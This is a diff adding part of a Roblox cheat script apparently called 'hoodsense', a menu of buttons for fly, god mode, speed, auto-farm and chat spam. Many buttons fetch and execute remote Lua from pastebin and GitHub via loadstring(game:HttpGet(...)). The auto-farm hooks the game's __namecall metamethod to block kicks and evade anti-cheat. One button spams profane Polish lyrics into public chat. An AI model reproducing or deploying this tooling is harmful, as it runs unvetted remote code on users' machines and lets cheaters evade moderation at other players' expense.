+--------------------------//   EXTRA  ----------------------------
+--------------------------   STUFF  //----------------------------
+--------------------------------------------------------------------
+local rejoin = Section8:CreateButton("Rejoin", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+end)
+rejoin:AddToolTip("Rejoins Server.")
+
+local hop = Section8:CreateButton("Server hop", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/serverhop.lua'))()
+end)
+local trash = Section8:CreateButton("Trash Talk", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/trash_talk.lua"))()
+end)
+trash:AddToolTip("Loads Trash Talk. [J]")
+
+local macro = Section8:CreateButton("Fake Macro", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/yMmUUyyE"))()
+end)
+macro:AddToolTip("Loads Fake Macro. [Z]")
+
+local fly = Section8:CreateButton("Fly", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/fly.lua"))()
+end)
+fly:AddToolTip("Loads Fly. [X]")
+
+local fullbright = Section8:CreateButton("Full Bright", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/full_bright.lua"))()
+end)
+fullbright:AddToolTip("Loads Full Bright.")
+
+local nocooldown = Section8:CreateButton("No jump cooldown", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/no-jump-cooldown.lua'))()
+end)
+nocooldown:AddToolTip("Removes jump cooldown.")
+
+local weightfarm = Section8:CreateButton("Weight Farm", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/weight_farm.lua'))()
+end)
+weightfarm:AddToolTip("Runs Weight Farm.")
+
+local god = Section9:CreateButton("God Mode", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/godmode.lua'))()
+end)
+god:AddToolTip("Makes you god mode. [THIS CANT BE STOPPED]")
+
+local reset = Section8:CreateButton("Reset Character", function(reset)
+    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end)
+reset:AddToolTip("Resets your character")
+
+local idepomilion = Section8:CreateButton('Sing', function()
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Mam głód pierdolę wszystko","All")
+wait(1)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ty stój kiedy idę po milion","All")
+wait(1.2)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("jxak znxów coś mi nie wyszło","All")
+wait(1.3)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i huj nadal idę po milion","All")
+wait(0.7)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("już nie czekam na przyszłość ","All")
+wait(0.8)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("alxe nie mów nic bo","All")
+wait(0.9)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("bo bo idę po milion", "All")
+end)
+
+--------------------------------------------------------------------
+--------------------------//    FUN   ----------------------------
+--------------------------   STUFF  //----------------------------
+--------------------------------------------------------------------
+local swagfly = Section9:CreateButton("Admin Fly", function ()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/admin_fly.lua'))()
+end)
+swagfly:AddToolTip("Loads Swag Mode Admin Fly! [X]")
+
+local Juggernaut = Section9:CreateButton("Juggernaut", function()
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local Mouse = LocalPlayer:GetMouse()
+    local OriginalKeyUpValue = 0
+    
+    local Anim = Instance.new("Animation")
+    Anim.AnimationId = "rbxassetid://2788838708"
+    
+    function StopAudio()
+        LocalPlayer.Character.LowerTorso.BOOMBOXSOUND:Stop()
+    end
+    
+    function stop(ID, Key)
+        local cor = coroutine.wrap(function()
+            wait(LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
+            if LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
+                StopAudio()
+            end
+        end)
+        cor()
+    end
+    
+    function play(ID, STOP, LMAO)
+        if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
+            local Tool = nil
+            if LocalPlayer.Character:FindFirstChildOfClass("Tool") and LMAO == true then
+                Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
+                LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
+            end
+            LocalPlayer.Backpack["[Boombox]"].Parent =
+                LocalPlayer.Character
+            game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
+            LocalPlayer.Character["[Boombox]"].RequiresHandle = false
+            if LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
+                LocalPlayer.Character["[Boombox]"].Handle:Destroy()
+            end
+            LocalPlayer.Character["[Boombox]"].Parent =
+                LocalPlayer.Backpack
+            LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
+            if Tool ~= true then
+                if Tool then
+                    Tool.Parent = LocalPlayer.Character
+                end
+            end
+            if STOP == true then
+                LocalPlayer.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
+                local cor = coroutine.wrap(function()
+                    repeat wait() until LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
+                    OriginalKeyUpValue = OriginalKeyUpValue+1
+                    stop(ID, OriginalKeyUpValue)
+                end)
+                cor()
+            end
+        end
+    end
+    
+    function Tool()
+        local Tool = Instance.new("Tool")
+        Tool.Name = "Juggernaut"
+        Tool.RequiresHandle = false
+        Tool.Activated:Connect(function()
+            local Character = LocalPlayer.Character
+            local Humanoid = Character:FindFirstChildOfClass("Humanoid")
+    
+            function rm()
+                for i,v in pairs(Character:GetDescendants()) do
+                    if v:IsA("BasePart") or v:IsA("MeshPart") then
+                        if v.Name ~= "Head" then
+                            for i,cav in pairs(v:GetDescendants()) do
+                                if cav:IsA("Attachment") then
+                                    if cav:FindFirstChild("OriginalPosition") then
+                                        cav.OriginalPosition:Destroy()
+                                    end
+                                end
+                            end
+                            for i,v in pairs(v:GetChildren()) do
+                                if v.Name == "OriginalSize" then
+                                    v:Destroy()
+                                end
+                            end
+                            if v:FindFirstChild("AvatarPartScaleType") then
+                                v:FindFirstChild("AvatarPartScaleType"):Destroy()
+                            end
+                        end
+                    end
+                end
+            end
+    
+            Humanoid:LoadAnimation(Anim):Play()
+            play(862491729, true, true)
+            wait(0.4)
+            rm()
+            Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
+            wait(0.2)
+    
+            rm()
+            Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
+            wait(0.02)
+    
+            rm()
+            Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
+            wait(0.02)
+    
+            rm()
+            Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
+            wait(0.02)
+        end)
+        Tool.Parent = LocalPlayer.Backpack
+    end
+    Tool()
+end)
+Juggernaut:AddToolTip("Makes you Juggernaut.")
+
+local avatarchanger = Section9:CreateButton("Avatar Modifier", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/facechanger.lua'))()
+end)
+avatarchanger:AddToolTip("Loads Avatar Modifier. [NOT FE]")
+
+local ben = Section9:CreateButton("Ben Talk", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/ben.lua"))()
+end)
+ben:AddToolTip("Loads Ben Talk. [K]")
+
+local swagfly = Section9:CreateButton("Admin Fly", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/cracked%20stuff/admin_fly.lua'))()
+end)
+swagfly:AddToolTip("Loads Swag Mode Admin Fly. [X]")
+
+
+local panic = Section9:CreateButton("Rage quit", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/ragequit.lua'))()
+end)
+panic:AddToolTip("Why u mad bro?")
+
+local superjump = Section9:CreateButton("Super Jump!", function()
+    local  MyStand = "DxskTilIDawn"
+    local SuperJumpEnabled = false
+    
+    getgenv().Toggled = false
+    local UIS = game:GetService("UserInputService")
+    UIS.InputBegan:connect(function(input,gameProcessed)
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            if input.KeyCode == Enum.KeyCode.H then
+                if UIS:GetFocusedTextBox() == nil then
+                    if getgenv().Toggled == false then
+                        getgenv().Toggled = true
+                    else
+                        getgenv().Toggled = true
+                    end;end;end;end;end)
+    
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local Cookies = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
+    local OriginalKeyUpValue = 0
+    local Anim = Instance.new("Animation" )
+    Anim.AnimationId = "rbxassetid://2788290270"
+    local Hover = Instance.new("Animation", game.Workspace)
+    Hover.Name = "Hover"
+    Hover.AnimationId = "rbxassetid://698251653"
+    local LeftPunch = Instance.new("Animation",  game.ReplicatedStorage.ClientAnimations)LeftPunch.Name = "LeftPunch"
+    LeftPunch.AnimationId = "rbxassetid://2788308661"
+    local LeftAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.LeftPunch)
+    local CoreUI = Instance.new("ScreenGui")
+    local Humanoid = game.Players.LocalPlayer.Character.Humanoid
+    CoreUI.Parent = game.CoreGui
+    local SaveLocation = nil
+    local RigWalk = nil
+    local RigIdle = nil
+    local InTimeErase = false
+    
+    local Pointing = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
+    Pointing.AnimationId = "rbxassetid://507770453"
+    
+    local UNMASKKK = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
+    UNMASKKK.Name = "Unmask"
+    UNMASKKK.AnimationId = "rbxassetid://3380629232"
+    
+    local MASKKK = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
+    MASKKK.Name = "Mask"
+    MASKKK.AnimationId = "rbxassetid://3380627692"
+    
+    local Poter = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
+    Poter.Looped = true
+    Poter.Priority = Enum.AnimationPriority.Action
+    
+    local WalkAnimation = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
+    WalkAnimation.AnimationId = "rbxassetid://2510198475"
+    
+    local Idle = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
+    Idle.AnimationId = "rbxassetid://507766388"
+    
+    local OldChar = LocalPlayer.Character
+    local MaskAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Mask)
+    local UnmaskAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Unmask)
+    
+    function FoV()
+        local fov = coroutine.wrap(function()
+            local Camera = workspace.Camera
+            for i = 1, 20 do
+                game.TweenService:Create(Camera, TweenInfo.new(0.5), {FieldOfView = 8*i}):Play()
+                wait(0.01)
+            end
+            for i = 1, 20 do
+                game.TweenService:Create(Camera, TweenInfo.new(0.5), {FieldOfView = 160-i*4.5}):Play()
+                wait(0.01)
+            end
+        end)
+        fov()
+    end
+    
+    local WalkSpeed = false
+    
+    local function rm()
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+            if v.Name == "OriginalPosition" then
+                v:Destroy()
+            elseif v.Name == "OriginalSize" then
+                v:Destroy()
+            elseif v.Name == "AvatarPartScaleType" then
+                v:Destroy()
+            end
+        end
+    end
+    
+    
+    function Lighting()
+        if game.Lighting:FindFirstChild("ERASE") == nil then
+            local sound5 = Instance.new("Sound", CoreUI)
+            sound5.Volume = 0.1
+            sound5.Name = "ERASE"
+            sound5.Looped = true
+            sound5.SoundId = "rbxassetid://3167092959"
+            sound5:Play()
+    
+            game.Lighting.Sky.Parent = workspace
+            game:GetObjects("rbxassetid://6546113226")[1].Parent=game.Lighting
+    
+        else
+            workspace.Sky.Parent = game.Lighting
+            CoreUI:FindFirstChild("ERASE"):Destroy()
+            game.Lighting:FindFirstChild("ERASE"):Destroy()
+        end
+    end
+    
+    function TimeEraseUI()
+        local sound5 = Instance.new("Sound", CoreUI)
+        sound5.Volume = 0.1
+        sound5.SoundId = "rbxassetid://6546128175"
+        sound5:Play()
+    
+        local Image = Instance.new("ImageLabel", CoreUI)
+        Image.Image = "http://www.roblox.com/asset/?id=6546043746"
+        Image.BackgroundTransparency = 1
+        Image.AnchorPoint = Vector2.new(0.5, 0.5)
+        Image.Size = UDim2.fromScale(1, 1)
+        Image.Position = UDim2.fromScale(-0.5, 0.5)
+        delay(0, function()
+            for i = 0, 1, 0.1 do
+                Image.Position = UDim2.fromScale(-Image.Position.X.Scale+i, 0.5)
+                Image.ImageTransparency = Image.ImageTransparency+i
+                wait(.01)
+            end
+            Image:Destroy()
+            sound5:Destroy()
+        end)
+    end
+    
+    
+    function ModelCharacter()
+        if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") == nil then
+            local MODEL = Instance.new("Model", workspace)
+            MODEL.Name = LocalPlayer.Name.."StringKOD"
+    
+            OldChar.Humanoid:UnequipTools()
+    
+            for i, v in pairs(OldChar:GetChildren()) do 
+                if (v:IsA("BasePart")  or v:IsA("MeshPart")) and v.Parent:FindFirstChildOfClass("Humanoid") and v.Name ~= "HumanoidRootPart" then
+                    local Part = v:Clone()
+                    Part.Parent = MODEL
+                    Part.Name = v.Name
+                    Part.Material = Enum.Material.ForceField
+                    Part.CFrame = v.CFrame
+                    Part.Transparency = 0.5 
+                    Part.BrickColor = BrickColor.Red()
+                    Part.CanCollide = false
+                    Part.Anchored = true
+                    for i, v  in pairs(Part:GetChildren()) do 
+                        if v.ClassName ~= "SpecialMesh" then
+                            v:Destroy()
+                        end
+                    end
+                end
+            end
+            local NewCharacter = game:GetObjects("rbxassetid://6547055500")[1]
+            NewCharacter.Parent = MODEL
+            NewCharacter.Name = "Idaro"
+    
+            workspace.Camera.CameraSubject = NewCharacter.Humanoid
+            SaveLocation = OldChar.HumanoidRootPart.CFrame
+            InTimeErase = true
+            NewCharacter.HumanoidRootPart.CFrame = SaveLocation
+    
+            RigIdle = NewCharacter:WaitForChild("Humanoid"):LoadAnimation(Idle)
+            RigIdle.Looped = true
+            RigIdle.Priority = Enum.AnimationPriority.Action
+            RigWalk = NewCharacter:WaitForChild("Humanoid"):LoadAnimation(WalkAnimation)
+            RigWalk.Looped = true
+            RigWalk.Priority = Enum.AnimationPriority.Action
+            WalkSpeed = true
+            RigIdle:Play()
+        else
+            InTimeErase = false
+            WalkSpeed = false
+            workspace.Camera.CameraSubject =  OldChar.Humanoid
+            OldChar.HumanoidRootPart.CFrame =  workspace:FindFirstChild(LocalPlayer.Name.."StringKOD").Idaro.HumanoidRootPart.CFrame
+            workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):Destroy()
+        end
+    end
+    
+    function Slide()
+        local XD = OldChar.Humanoid:LoadAnimation(Anim)
+        XD:Play()
+        XD.TimePosition = 0.15
+        XD.Looped = false
+        XD:AdjustSpeed(1.1)
+    end
+    
+    function AddVelocity(Vel, Char)
+        Char.HumanoidRootPart.Velocity = Char.HumanoidRootPart.Velocity+Vel
+    end
+    
+    local IsJump = false
+    
+    function Jumping()
+        if IsJump == false then
+            return false
+        else
+            return true
+        end
+    end
+    
+    local Mouse = LocalPlayer:GetMouse()
+    
+    local MoveDirection = Vector3.new(0,0,0)
+    local WSpped = 0 
+    local LeftSpeed = 0
+    local UpSpeed = 0
+    
+    function IdleRigXD()
+        if RigIdle and RigWalk.IsPlaying and WSpped == 0 and LeftSpeed == 0 and UpSpeed == 0 then
+            RigIdle:Play()
+            RigWalk:Stop()
+        end
+    end
+    
+    function WalkRigXD()
+        if RigWalk and RigIdle.IsPlaying then
+            RigIdle:Stop()
+            RigWalk:Play()
+        end
+    end
+    
+    Mouse.KeyDown:Connect(function(KeyDownXD)
+        if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") then
+            if KeyDownXD == "w" then
+                WSpped = -1
+                WalkRigXD()
+            elseif KeyDownXD == "a" then
+                LeftSpeed = -1
+                WalkRigXD()
+            elseif KeyDownXD == "d" then
+                LeftSpeed = 1
+                WalkRigXD()
+            elseif KeyDownXD == "s" then
+                WSpped = 1
+                WalkRigXD()
+            end
+        end
+    end)
+    
+    Mouse.KeyUp:Connect(function(KeyDownXD)
+        if KeyDownXD == "w" then
+            WSpped = 0
+            IdleRigXD()
+        elseif KeyDownXD == "a" then
+            LeftSpeed = 0
+            IdleRigXD()
+        elseif KeyDownXD == "d" then
+            LeftSpeed = -0
+            IdleRigXD()
+        elseif KeyDownXD == "s" then
+            WSpped = 0
+            IdleRigXD()
+        end
+    end)
+    
+    local CD = false
+    local uis = game:GetService("UserInputService")
+    
+    uis.InputBegan:Connect(function(i, XD)
+        if i.KeyCode == Enum.KeyCode.H and XD == false then
+            if SuperJumpEnabled == false then
+                SuperJumpEnabled = true
+            elseif SuperJumpEnabled == true then
+                SuperJumpEnabled = false
+            end
+        end
+    end)
+    
+    uis.InputBegan:Connect(function(i, XD)
+        if i.KeyCode == Enum.KeyCode.Space and XD == false then
+            if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") == nil then
+                if Jumping() == true and not Poter.IsPlaying then
+                    AddVelocity(OldChar.HumanoidRootPart.CFrame.LookVector*150, OldChar)
+                    IsJump = false
+                    Cookies:Stop()
+                    CD = true
+                    Slide()
+                    repeat wait() until workspace:FindPartOnRayWithWhitelist(Ray.new(OldChar.HumanoidRootPart.Position, Vector3.new(0, -4 * OldChar.HumanoidRootPart.Size.y, 0)), { workspace.MAP })
+                    CD = false
+                end
+            else
+                workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):FindFirstChild("Idaro").Humanoid:ChangeState(3)
+            end
+        end
+    end)
+    
+    function StopAudio()
+        OldChar.LowerTorso.BOOMBOXSOUND:Stop()
+    end
+    
+    function stop(ID, Key)
+        local cor = coroutine.wrap(function()
+            wait(OldChar.LowerTorso.BOOMBOXSOUND.TimeLength-0)
+            if OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
+                StopAudio()
+            end
+        end)
+        cor()
+    end
+    
+    
+    function play(ID, STOP, LMAO)
+        if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
+            local Tool = nil
+            if OldChar:FindFirstChildOfClass("Tool") and LMAO == true then
+                Tool = OldChar:FindFirstChildOfClass("Tool")
+                OldChar:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
+            end
+            LocalPlayer.Backpack["[Boombox]"].Parent =
+                OldChar
+            game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
+            OldChar["[Boombox]"].RequiresHandle = false
+            if OldChar["[Boombox]"]:FindFirstChild("Handle") then
+                OldChar["[Boombox]"].Handle:Destroy()
+            end
+            OldChar["[Boombox]"].Parent =
+                LocalPlayer.Backpack
+            LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
+            if Tool ~= true then
+                if Tool then
+                    Tool.Parent = OldChar
+                end
+            end
+            if STOP == true then
+                OldChar.LowerTorso:WaitForChild("BOOMBOXSOUND")
+                local cor = coroutine.wrap(function()
+                    repeat wait() until OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OldChar.LowerTorso.BOOMBOXSOUND.TimeLength > 0
+                    OriginalKeyUpValue = OriginalKeyUpValue+1
+                    stop(ID, OriginalKeyUpValue)
+                end)
+                cor()
+            end
+        end
+    end
+    
+    local bro = false
+    local TimeErase, CanCel = "Time erase!", "Time erase!"
+    local TimeStop, TimeResume = "Time stop!", "Time stop!"
+    local XD = false
+    LocalPlayer.Chatted:Connect(function(MSG)
+        if MSG == "Rage!" then
+    if Humanoid:FindFirstChild("HeadScale") then
+        rm()
+        wait(0.6)
+    
+        Humanoid:FindFirstChild("HeadScale"):Destroy()
+        wait(0.6)
+    end
+    
+    
+    if Humanoid:FindFirstChild("BodyWidthScale") then
+        rm()
+        wait(0.6)
+        Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
+        wait(0.6)
+    end
+    
+    
+    
+    if Humanoid:FindFirstChild("BodyDepthScale") then
+        rm()
+        wait(0.6)
+        Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
+        wait(0.6)
+    end
+    
+    
+    
+    if Humanoid:FindFirstChild("BodyTypeScale") then
+        rm()
+        wait(0.6)
+        Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
+       wait(0.6)
+    end
+        elseif MSG:sub(1, 11) == TimeErase and XD == false and not Poter.IsPlaying then
+            XDDDD(XD)
+        elseif MSG == CanCel and XD == true and not Poter.IsPlaying then
+            XDDDD(XD)
+        elseif MSG == TimeStop then
+            play(6947054675, true, true)
+            wait(0.3)
+            OldChar.LowerTorso.BOOMBOXSOUND.SoundId = "http://www.roblox.com/asset/?id=wd"
+            wait(0.1)
+            play(7084712646, true, true)
+        end
+    end)
+    
+    function XDDDD(XDR)
+        if XDR == false then
+            XD = true
+            play(6546133414, true, true)
+            wait(2)
+            TimeEraseUI()
+            FoV()
+            Lighting()
+            ModelCharacter()
+        else
+            XD = false
+            InTimeErase = false
+            wait(0.1)
+            play(6543435253, true, true)
+            TimeEraseUI()
+            ModelCharacter()
+            Lighting()
+            FoV()
+    end
+    end
+    
+    function Jump(...)
+        (...).Jumping:Connect(function()
+            if SuperJumpEnabled == true then
+            if CD == false and not Poter.IsPlaying then
+                CD = true
+                delay(1, function()
+                    CD = false
+                end)
+                Cookies:Play(0, 1, 1.4)
+                AddVelocity(OldChar.HumanoidRootPart.CFrame.UpVector*120, OldChar)
+                delay(0, function()
+                    IsJump = true
+                    wait(1) 
+                    if IsJump == true then
+                        IsJump = false
+                    end
+                end)
+                end
+            end
+        end)
+    end
+    
+    
+    Jump(OldChar.Humanoid)
+    
+    LocalPlayer.CharacterAdded:Connect(function(Character)
+        wait(1)
+        if Character.Name == LocalPlayer.Name then
+            Jump(Character.Humanoid)
+            Poter = Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
+            Poter.Looped = true
+            Poter.Priority = Enum.AnimationPriority.Action
+    
+            Cookies = Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
+            OldChar = Character
+        end
+    end)
+    
+    game["Run Service"].Heartbeat:Connect(function()
+        if InTimeErase then
+            for i, v in pairs(OldChar:GetChildren()) do
+                if v:IsA("BasePart") then
+                    v.CFrame = CFrame.new(math.random(200, 500), math.random(200, 500), math.random(200, 500))
+                    v.Velocity = Vector3.new(0,0,0)
+                end
+            end
+    
+            if OldChar:FindFirstChild("Combat") and XD == true then
+                XD = false
+                XDDDD(true)
+            end
+    
+            if WalkSpeed == true then
+                MoveDirection = Vector3.new(LeftSpeed, UpSpeed, WSpped)
+                workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):FindFirstChild("Idaro").Humanoid:Move(MoveDirection, true)
+            end
+        else
+            if OldChar:FindFirstChild("[Flashlight]") then
+                if workspace.Players:FindFirstChild(MyStand) then
+                    if not Poter.IsPlaying then
+                        Poter:Play()
+                        Poter:AdjustSpeed(0)
+                        Poter.TimePosition = 1.2
+                    end
+                    local lol = workspace.Players:FindFirstChild(MyStand).HumanoidRootPart.CFrame * CFrame.new(0, 0.5, 1.25)
+                    OldChar.HumanoidRootPart.CFrame = lol
+                end
+            else
+                if Poter.IsPlaying then
+                    Poter:Stop()
+                end
+            end
+        end
+    end)	
+end)
+superjump:AddToolTip("Tip: Type 'Time erase!' in chat to time erase")
+
+local speedboost = Section9:CreateButton("Speed", function()
+    plr = game:GetService('Players').LocalPlayer
+    down = true
+     
+    function onButton1Down(mouse)
+        down = true
+        while down do
+            if not down then break end
+            local char = plr.Character
+            char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 190
+            wait()
+        end
+    end
+     
+    function onButton1Up(mouse)
+        down = false
+    end
+     
+    function onSelected(mouse)
+        mouse.KeyDown:connect(function(m) if m:lower()=="c"then onButton1Down(mouse)end end)
+        mouse.KeyUp:connect(function(m) if m:lower()=="c"then onButton1Up(mouse)end end)
+    end
+    onSelected(game.Players.LocalPlayer:GetMouse())
+end)
+speedboost:AddToolTip("Makes you faster when pressing 'C'")
+getgenv().Multiplier = -0.27
+local antilock = Section9:CreateButton("Antilock", function()
+    local userInput = game:service('UserInputService')
+    local runService = game:service('RunService')
+    userInput.InputBegan:connect(function(Key)
+    if Key.KeyCode == Enum.KeyCode.H then
+        Enabled = not Enabled
+        if Enabled == true then
+            repeat
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getgenv().Multiplier
+                runService.Stepped:wait()
+            until Enabled == false
+        end
+    end
+end)
+end)
+antilock:AddToolTip("Enables antilock [H].")
+
+local autofarm = section54:CreateToggle("Auto Farm", nil, function(texto)
+	repeat
+		wait()
+	until game:IsLoaded()
+	local gm = getrawmetatable(game)
+	setreadonly(gm, false)
+	local namecall = gm.__namecall
+	gm.__namecall =
+		newcclosure(
+		function(self, ...)
+			local args = {...}
+			if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "MainEvent" then
+				if tostring(getcallingscript()) ~= "Framework" then
+					return
+				end
+			end
+			if not checkcaller() and getnamecallmethod() == "Kick" then
+				return
+			end
+			return namecall(self, unpack(args))
+		end
+	)
+	
+	local LocalPlayer = game:GetService("Players").LocalPlayer
+	
+	function gettarget()
+		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+		local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+		local maxdistance = math.huge
+		local target
+		for i, v in pairs(game:GetService("Workspace").Cashiers:GetChildren()) do
+			if v:FindFirstChild("Head") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+				local distance = (HumanoidRootPart.Position - v.Head.Position).magnitude
+				if distance < maxdistance then
+					target = v
+					maxdistance = distance
+				end
+			end
+		end
+		return target
+	end
+	
+	for i, v in pairs(workspace:GetDescendants()) do
+		if v:IsA("Seat") then
+			v:Destroy()
+		end
+	end
+	
+	shared.MoneyFarm = texto
+	
+	while shared.MoneyFarm do
+		wait()
+		local Target = gettarget()
+		repeat
+			wait()
+			pcall(
+				function()
+					local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+					local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+					local Combat = LocalPlayer.Backpack:FindFirstChild("Combat") or Character:FindFirstChild("Combat")
+					if not Combat then
+						Character:FindFirstChild("Humanoid").Health = 0
+						return
+					end
+					HumanoidRootPart.CFrame = Target.Head.CFrame * CFrame.new(0, -2.5, 3)
+					Combat.Parent = Character
+					Combat:Activate()
+				end
+			)
+		until not Target or Target.Humanoid.Health < 0
+		for i, v in pairs(game:GetService("Workspace").Ignored.Drop:GetDescendants()) do
+			if v:IsA("ClickDetector") and v.Parent and v.Parent.Name:find("Money") then
+				local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+				local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+				if (v.Parent.Position - HumanoidRootPart.Position).magnitude <= 18 then
+					repeat
+						wait()
+						fireclickdetector(v)
+					until not v or not v.Parent.Parent
+				end
+			end
+		end
+		wait(1)
+	end
+end)
+autofarm:CreateKeybind("", function()
+end)
+autofarm:AddToolTip("Enables Autofarm.")
+------------------------
+---// CREDITS PAGE ---
+local CreditsLabel1 = Section13:CreateLabel("Made with love by hoodsense team!")
+CreditsLabel1:UpdateText("Made with love by hoodsense team!")
+local discord = Section13:CreateButton("Brought to you by hoodsense.", function(bool)
+    setclipboard("pawel#0008 <@804245361894883339> | xdzz#2137 <@935540113369346130> | https://hoodsense.cf/")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Credits Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+
+local esko = Section13:CreateButton("Owned by ekso.gq", function(bool)
+    setclipboard("https://ekso.gq")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Credits Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+
+local CreditsLabel2 = Section13:CreateLabel("© 2022 ekso.gq")
+CreditsLabel2:UpdateText("(C) 2022 ekso.gq")
+local CreditsLabel3 = Section13:CreateLabel("Staff")
+CreditsLabel3:UpdateText("Staff")
+
+local discord1 = Section13:CreateButton("pawel#0008", function(bool)
+    setclipboard("pawel#0008 <@804245361894883339>")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Credits Copied on clipboard!";
